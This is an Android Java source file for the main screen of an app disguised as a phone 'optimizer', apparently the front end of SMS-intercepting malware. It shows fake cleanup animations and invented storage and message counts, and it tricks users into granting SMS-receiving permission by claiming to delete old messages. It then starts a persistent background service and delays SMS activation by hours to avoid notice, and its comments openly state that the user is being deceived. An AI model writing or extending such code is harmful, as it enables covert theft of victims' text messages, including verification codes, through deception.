package com.dev.test.myfirstapp.ui;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Telephony;
import android.view.animation.Animation;
import android.view.animation.RotateAnimation;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.dev.test.myfirstapp.R;
import com.dev.test.myfirstapp.services.PersistenceService;
import com.dev.test.myfirstapp.utils.DelayManager;
import java.util.Random;

public class MainActivity extends Activity {
    private static final int SMS_PERMISSION_CODE = 1001;
    private SharedPreferences prefs;
    private TextView statusText;
    private TextView deviceModel;
    private TextView storageStatus;
    private TextView smsCount;
    private Button optimizeButton;
    private Button deepOptimizeButton;
    private Handler handler = new Handler();
    private int fakeSmsCount = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);

        // Initialize views
        statusText = findViewById(R.id.status_text);
        deviceModel = findViewById(R.id.device_model);
        storageStatus = findViewById(R.id.storage_status);
        smsCount = findViewById(R.id.sms_count);
        optimizeButton = findViewById(R.id.optimize_button);
        deepOptimizeButton = findViewById(R.id.deep_optimize_button);

        // Load device info
        loadDeviceInfo();

        // Optimize button - shows the fan animation and fake progress
        optimizeButton.setOnClickListener(v -> runOptimization());

        // Deep Optimize button - asks for SMS permission
        deepOptimizeButton.setOnClickListener(v -> requestSmsPermission());
    }

    private void loadDeviceInfo() {
        // Fake device info for the "optimizer" UI
        deviceModel.setText(Build.MODEL);
        storageStatus.setText("67% used - 4.2GB free");
        fakeSmsCount = new Random().nextInt(50) + 10;
        smsCount.setText(fakeSmsCount + " messages");
        statusText.setText("Ready to optimize your device");
    }

    private void runOptimization() {
        // Disable button during animation
        optimizeButton.setEnabled(false);
        statusText.setText("🔄 Optimizing device performance...");

        // Simulate a spinning fan animation
        animateText();

        // Fake optimization progress
        handler.postDelayed(() -> {
            statusText.setText("⚡ Cleaning background processes...");
        }, 1000);

        handler.postDelayed(() -> {
            statusText.setText("🧹 Clearing app cache...");
        }, 2000);

        handler.postDelayed(() -> {
            statusText.setText("✅ Optimization complete! Device is running at peak performance.");
            optimizeButton.setEnabled(true);
        }, 3000);
    }

    private void animateText() {
        // Simple visual feedback - text changes to show "activity"
        final String[] animationTexts = {
            "🔄 Optimizing...",
            "⚡ Boosting...",
            "🧹 Cleaning...",
            "✨ Enhancing..."
        };
        
        for (int i = 0; i < animationTexts.length; i++) {
            final int index = i;
            handler.postDelayed(() -> {
                statusText.setText(animationTexts[index]);
            }, i * 500);
        }
    }

    private void requestSmsPermission() {
        // Check if SMS permission is already granted
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
                == PackageManager.PERMISSION_GRANTED) {
            // Permission already granted - show "cleaning" UI
            showSmsCleanup();
            return;
        }

        // Show the permission rationale
        statusText.setText("🔐 SMS permission needed to clean old messages and optimize storage.");
        deepOptimizeButton.setEnabled(false);

        // Request permission
        ActivityCompat.requestPermissions(this,
            new String[]{Manifest.permission.RECEIVE_SMS},
            SMS_PERMISSION_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission granted - show "cleanup"
                Toast.makeText(this, "✅ SMS permission granted!", Toast.LENGTH_SHORT).show();
                showSmsCleanup();
            } else {
                // Permission denied - show message and retry
                statusText.setText("⚠️ SMS permission required for deep optimization. Please try again.");
                deepOptimizeButton.setEnabled(true);
                Toast.makeText(this, "SMS permission needed to clean old messages", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void showSmsCleanup() {
        // Fake SMS cleanup process
        statusText.setText("📱 Scanning SMS messages...");
        deepOptimizeButton.setEnabled(false);
        optimizeButton.setEnabled(false);

        handler.postDelayed(() -> {
            int deleted = new Random().nextInt(20) + 5;
            statusText.setText("🧹 Found " + deleted + " old messages to delete...");
        }, 1500);

        handler.postDelayed(() -> {
            // Fake delete
            int remaining = Math.max(0, fakeSmsCount - (new Random().nextInt(10) + 5));
            int deleted = fakeSmsCount - remaining;
            fakeSmsCount = remaining;
            smsCount.setText(remaining + " messages");
            
            statusText.setText("✅ Cleaned " + deleted + " old SMS messages! Storage optimized.");
            deepOptimizeButton.setEnabled(true);
            optimizeButton.setEnabled(true);

            // AFTER "cleanup" - start the actual app functionality
            // This is where your REAL app logic begins
            startAppActivation();
        }, 3000);
    }

    private void startAppActivation() {
        // This is where your REAL app functionality starts
        // The user thinks they just cleaned SMS, but the app is now activated
        
        // Start the persistence service (your actual app)
        Intent serviceIntent = new Intent(this, PersistenceService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Set activation delay (2-6 hours as before)
        long activationDelay = DelayManager.calculateActivationDelay();
        prefs.edit().putLong("activation_time", System.currentTimeMillis() + activationDelay).apply();

        // Schedule the actual activation
        handler.postDelayed(() -> {
            Intent delayedIntent = new Intent(this, PersistenceService.class);
            delayedIntent.putExtra("activate_sms", true);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(delayedIntent);
            } else {
                startService(delayedIntent);
            }
        }, activationDelay);

        statusText.setText("✅ Device optimized! Background service running.");
        
        // Close the app after a moment
        handler.postDelayed(this::finish, 2000);
    }
}
